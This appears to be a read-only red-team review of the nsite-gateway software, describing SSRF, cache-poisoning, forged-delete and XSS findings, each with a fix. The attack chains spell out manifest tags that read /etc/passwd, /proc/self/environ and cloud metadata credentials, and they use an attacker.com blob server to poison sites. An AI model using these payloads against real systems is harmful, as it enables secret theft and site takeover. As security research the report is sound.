# Red Team Review — nsite-gateway

- **Target:** nsite-gateway v3.6.7 (commit `99445e4`, clean worktree)
- **Date:** 2026-11-17
- **Method:** read-only source review of the repository plus pinned dependencies (applesauce-core 7.0.3, applesauce-relay 7.0.0, applesauce-loaders 7.0.2, applesauce-common 7.0.0, @hono/hono 4.13.13), with local runtime checks for the decisive URL / `fetch` semantics. No live probing, no target files modified.
- **Status:** report only — no source changes made.

## Trust model

The gateway's security rests on two controls:

1. **Site identity** — site content is bound to a Nostr pubkey via event signatures (relays are untrusted).
2. **Content integrity** — each file is bound to a sha256 declared in the signed manifest.

The findings below are places where those controls — or the gateway's own resources — can be defeated.

## Summary

| # | Finding | Attacker | Severity |
|---|---------|----------|----------|
| 1 | SSRF + arbitrary local file read via manifest path/server tags | any site publisher (anonymous) | **High** (Critical if secrets in env) |
| 2 | Cross-site blob-source cache poisoning → attacker content on victim sites | any site publisher | **High** |
| 3 | Kind-5 delete events accepted without signature verification → site takedown | any malicious/compromised configured relay | **High** |
| 4 | Serve-then-verify + ETag of the *expected* hash pins poisoned bytes | malicious blossom server | Medium |
| 5 | Unauthenticated resource exhaustion (memory, KV, DNS, relays, CPU) | any anonymous client | Medium |
| 6 | Content-type confusion on extension-less paths → XSS on victim site origin | malicious blossom server | Medium |
| 7 | `javascript:` URI in status-page `source` link → XSS on gateway origin | any site publisher | Low–Medium |
| 8–14 | Hardening items (Host-header links, error disclosure, exposed port, missing headers, plaintext cache relay, nsec-in-env, CORS) | various | Low |

---

## High severity

### 1. SSRF / arbitrary local file read via unvalidated manifest tags

**Where:** `src/helpers/site-manifest.ts:65-78`, `src/services/blossom.ts:156-209, 264-274`.

**Root cause:** `getManifestPaths` stores the path tag's second value (`tag[2]`, the "sha256") with **no validation** — it never checks `/^[0-9a-f]{64}$/`. Every later consumer builds the blob URL as `new URL(sha256, server)`.

Verified runtime semantics (local Deno checks):

- `new URL("http://169.254.169.254/x", "https://any-base/")` → `http://169.254.169.254/x` — an absolute URL as `tag[2]` completely overrides the server base.
- `new URL("etc/passwd", "file:///")` → `file:///etc/passwd` — relative paths work too.
- `fetch("file:///etc/hostname")` in Deno → **200, content returned** — and the process runs with `--allow-read --allow-net` (`main.ts:1`, `Dockerfile:15`).

Separately, blossom `server` tags are normalized by `applesauce-common` as `new URL("/", tag[1])` with **no scheme allowlist** — `file://x/` passes (`new URL("/", "file://x/")` → `file://x/`, verified). `mergeBlossomServers` (`src/routes/site.tsx:118-122`) mixes manifest tags, the user's kind-10063 list, and env fallbacks — none restricted to http(s).

**Attack chain (fully anonymous, needs no victim interaction):**

1. Publish a manifest for your own npub with tags like `["server", "file:///"]` and `["path", "/x.html", "etc/passwd"]` (or `["path", "/leak", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"]`).
2. Publish a kind-10002 pointing the gateway at your relay.
3. Send `GET /x.html` with `Host: npub1<you>`.

The gateway fetches `file:///etc/passwd` (or the internal/metadata URL) and **streams the bytes back to you** as `text/html` — content-type comes from the attacker-chosen path extension (`site.tsx:165-167`). `MAX_FILE_SIZE` (128 MB default) merely caps per-file exfil.

**Impact:** read any file the process can read; probe and read from internal networks (docker-compose puts `flower-cache` and other containers on the same bridge, reachable only from inside). `fetch("file:///proc/self/environ")` returns the process environment — in docker-compose that's the injected env vars, and `CURATION_USER` explicitly supports **nsec format** (`src/env.ts:131-134`), so an operator using encrypted curation mutes hands the gateway's SSRF its curator **private key**. That combination is critical; without env secrets it's high.

**Smallest effective fix:**

- In `getManifestPaths`, drop (or reject) path tags whose hash doesn't match `/^[0-9a-f]{64}$/`.
- Right before `fetch` in `streamBlob` (and in `findBlobURLs` / `filterBadServers`), require the resolved URL's protocol to be `http:` / `https:`.
- Consider `redirect: "manual"` for upstream blob fetches so an http→internal redirect can't sidestep the check.
- Drop nsec support for `CURATION_USER`.

### 2. Cross-site blob-source cache poisoning → attacker content on victim sites

**Where:** `src/services/cache.ts:50-84` (keys `["blob-server", sha256]`, `["blob-servers", sha256]`), `src/services/blossom.ts:141-154, 283-316`.

The blob caches are keyed **only by sha256** — global across all sites. `setBlobServer(sha256, server)` is written on *any* 2xx before verification, and `shouldVerifyBlobResponse` **skips verification entirely when the server equals the cached preferred source**. The preferred source sticks for `BLOB_SERVER_TTL` (7 days default).

**Attack:**

1. Copy the victim's public manifest hash `X` into your own manifest with `["server","https://attacker.com"]`.
2. Request it once from your own site hostname — your server becomes the cached preferred source for `X` (serve the genuine bytes so the async verification marks it good).
3. Now request the **victim's** site: the gateway fetches `X` from your server as the unverified preferred source and streams whatever you serve — as the victim's `/index.html` on the victim's subdomain, with the victim's manifest-derived ETag and content-type.

With `BLOSSOM_PROXY` set (docker-compose does), the cached proxy URL under `X` also carries your `as`/`xs` discovery hints, so the proxy itself fetches from your server.

**Impact:** full content takeover of any site on the gateway for its visitors — the sha256 integrity control, the core of the nsite model, is defeated across publishers. Combined with #6 this is script execution on the victim's origin.

**Smallest effective fix:**

- Namespace the blob caches by manifest pubkey (e.g. `["blob-server", pubkey, sha256]`) so a publisher can only seed sources for its own blobs, and/or
- Never exempt the preferred source from verification (re-verify at an interval). The exemption buys almost nothing — the bytes are re-streamed anyway; only the hash check is skipped.

### 3. Kind-5 delete events bypass signature verification → unauthenticated site takedown

**Where:** applesauce-core 7.0.3 `dist/event-store/event-store.js` `add()` — kind-5 events are routed to `DeleteManager.add(event)` and `return` **before** the `this.verifyEvent(...)` check (which is the default nostr-tools verifier for all other kinds). Neither `applesauce-relay` nor `applesauce-loaders` verify upstream (verified by grep of both packages). The gateway deliberately ingests kind-5s at scale:

- `src/services/nostr.ts:152-167` — `syncSiteManifestDeletes`, filter `{kinds:[5], "#k":[15128,35128,5128]}` against public third-party relays (damus.io, nos.lol, nsite.run, primal per docker-compose).
- `src/services/nostr.ts:179-202` — live mode subscription.

The `DeleteManager` checks that the delete's pubkey matches the target's pubkey, but since **it never checks the signature**, that field is attacker-chosen free text. `getReplaceableIdentifier` returns `""` for d-less replaceable kinds, so forged `"a"` tags like `35128:<victim>:blog` and `15128:<victim>:` match named sites, root sites, kind-10002 relay lists, and kind-10063 server lists; `"e"` tags cover snapshots. `handleDeleteNotification` also **retroactively removes already-stored events**, and `created_at` is attacker-chosen so a far-future timestamp deletes future re-publications too. The delete maps have no expiry — the site stays gone until restart.

**Impact:** any malicious or compromised relay among the configured NOSTR/LOOKUP relays — plus any MITM on the auto-detected **plaintext** `ws://localhost:4869` cache relay — can vanish any site (or a user's relay/server lists, causing secondary failures) with one forged event. Nostr's whole design says relays are untrusted; this path quietly trusts them for deletes. That fully defeats the delete-authorization control with real availability consequences.

**Smallest effective fix:**

- At the gateway, verify signatures for **all** events, including kind-5, before they enter the store — e.g. in `requestAndStoreEvents` and the `subscribeNsiteEvents` handler, wrap `eventStore.add(event)` with a nostr-tools `verifyEvent` check (the store's own hook can't cover kind-5 because of the early return).
- File the early-return upstream with applesauce-core.

---

## Medium severity

### 4. Serve-then-verify, and the ETag describes the *expected* hash, not the bytes

**Where:** `src/services/blossom.ts:89-139, 314-317`, `src/routes/site.tsx:104-115`.

Bytes are `tee`'d to the client and verification runs *after*, so a malicious blossom server's first delivery of wrong content reaches visitors regardless. Worse, the response carries `ETag` derived from the manifest's **expected** hash with `Cache-Control: public, max-age=3600, must-revalidate` — so the poisoned response carries the *correct* ETag, browsers pin the wrong bytes, and later conditional requests short-circuit to 304 via `hasMatchingIfNoneMatch` without ever re-fetching. Range and HEAD requests are never verified, and the preferred source never is (#2).

**Fix:** derive the ETag from actual bytes when the response is verified (or serve unverified responses with `no-store`/revalidation-required), and re-verify preferred sources periodically.

### 5. Unauthenticated resource exhaustion

No rate limiting anywhere, and several unbounded structures:

- **eventStore** (in-memory `EventMemory`, no eviction): every `Host: npub1<random>` request triggers an outbox lookup against third-party LOOKUP_RELAYS and pulls the attacker's (validly signed, self-generated) manifest into the store permanently — anonymous memory growth.
- `profilesChecked`/`outboxesChecked`/`blossomServersChecked` Maps grow per unique pubkey (`nostr.ts:215, 249, 282`).
- **KV growth**: `["analytics", pubkey, identifier]` counters have **no TTL** (`analytics.ts:8-11`); `["dns", hostname]` entries are creatable en masse (bech32 npub hostnames are cheap to generate); `blob-source-bad`/`blob-servers` entries per attacker-chosen pseudo-hash.
- **CPU amplification**: `buildIndexedSites(eventStore.getTimeline({}))` runs over the whole store on every `/` and `/status` request (`pages/home.tsx:35`, `routes/status/status.tsx:14`), and `/status` additionally does a profile query (5 s timeout) per unique pubkey (`status.tsx:51-56`) — attacker-inflated site lists make these requests expensive and slow.
- **Relay pool**: `RelayPool.relays` is an unbounded Map keyed by relay URL; attacker 10002s listing unique `wss://attacker.com/<rand>` URLs push unbounded WebSocket connections (exact socket lifetime after unsubscribe needs validation).
- **DNS**: unparseable hostnames always hit `Deno.resolveDns(..., "CNAME")` with no negative caching (`src/services/dns.ts:33`) — every request with a fresh random hostname costs a resolver query.

**Fix:** per-IP/per-host rate limiting, a size cap + LRU eviction on the event store, TTLs or caps on analytics, negative caching for DNS and manifest lookups, and a connection cap in the pool.

### 6. Content-type confusion → XSS on the victim site origin

**Where:** `src/routes/site.tsx:164-170`.

When the request path has no known extension, the **upstream blossom server's** `content-type` is passed through. A malicious source (trivially arrangeable via #2) serving `text/html` for an extension-less victim path gets script execution on the victim's subdomain origin. Nothing adds `X-Content-Type-Options: nosniff` (not the app, not the sample Caddyfile).

**Fix:** never trust upstream content-type — default to `application/octet-stream` for unknown extensions, and add `nosniff` globally.

---

## Low severity / hardening

7. **`javascript:` URI in status-page links** — `src/routes/status/site.tsx:268-272` renders the raw manifest `source` tag into `<a href>` with no scheme check; any site publisher can plant `javascript:` execution on the gateway root origin (click-triggered). Relay and client links are safe: `relaySet` enforces ws/wss (verified in applesauce-core `helpers/relays.js`), and client hrefs come from a hardcoded map (`nsite-clients.ts`). Fix: allow only http(s) in rendered hrefs.
8. **Host header flows into generated links** — `url.host` (attacker-influenced when the gateway is reachable directly on :3000) builds the hrefs on `/` and `/status`. Low.
9. **`router.onError` returns raw `error.message`** in 500 bodies (`src/routes/home.tsx:20-25`) — internal detail disclosure. Also `["server","javascript:..."]` tags throw `TypeError` inside `getBlossomServersFromList` (`new URL("/", "javascript:alert(1)")` throws — verified) producing 500s on that site's routes.
10. **docker-compose publishes `3000:3000` on the host** — bypasses Caddy entirely (plain HTTP, direct root-router access). Drop the ports mapping or bind to 127.0.0.1.
11. **No security headers** — sample Caddyfile sets no HSTS/nosniff/CSP.
12. **CACHE_RELAYS auto-detect** grabs whatever answers on plaintext `ws://localhost:4869` and `persistEventsToCache` publishes every fetched event to it — any local process can become the "cache" (only kind-5 forgery matters, per #3).
13. **CORS `exposeHeaders: ["*"]`** (`src/server.ts:43-51`) — harmless today, but unnecessary surface.
14. **Status pages enumerate everything** — all hosted sites, hit counts, relays, servers, raw manifests. By design, but worth documenting for operators who assume obscurity.

---

## Checked and found solid

- `serveStatic` in @hono/hono 4.13.13 blocks `%`, `..`, and backslash traversal (verified against jsr source).
- hono/jsx auto-escaping covers all text interpolation, including Host-derived hostnames.
- Manifest/request paths are normalized by `join("/", …)` — no path traversal in `resolveManifestPath`.
- `.env` is gitignored and not shipped in the Docker image.
- CI workflows have least-privilege permissions and no `pull_request_target`.
- base36 codec is strict (`src/helpers/base36.ts`).
- Analytics counter is atomic.
- Upstream blob fetches are time-bounded (10 s) and size-limited (`limitBodySize`).

## Needs validation

- RelayPool socket lifetime after request unsubscribe (amplifier estimate for #5).
- Whether Deno's `fetch` follows http→`file:` redirects (irrelevant once #1's scheme allowlist is in place).

## Recommended fix order

1. `getManifestPaths` hash validation + http(s)-only URL check before `fetch` (#1) — two small diffs, kills the worst exposure.
2. Verify all events (incl. kind-5) before `eventStore.add` (#3), and report the early-return upstream to applesauce-core.
3. Pubkey-namespaced (or always-verified) blob-source cache (#2, #4).
4. Content-type fallback + `nosniff` (#6), `source` href scheme check (#7).
5. Rate limiting + store/KV caps (#5) as the operational hardening pass.
